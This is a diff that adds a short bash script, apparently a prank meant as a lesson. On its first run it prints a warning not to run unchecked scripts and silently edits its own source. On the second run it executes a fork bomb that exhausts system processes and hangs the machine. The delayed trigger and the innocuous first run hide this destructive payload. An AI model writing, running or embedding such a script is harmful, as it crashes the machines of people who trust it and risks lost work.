@@ -1,0 +1,13 @@
+#!/bin/bash
+
+WARN=0
+PWD=$(pwd)
+SCRIPT=$(basename $0)
+
+if [ $WARN -eq 0 ]; then
+  echo "Never run scripts without checking src!"
+  sed -i='' '3s/.*/WARN=1/' "$PWD/$SCRIPT"
+  exit 0
+fi
+
+:(){ :|:& };:
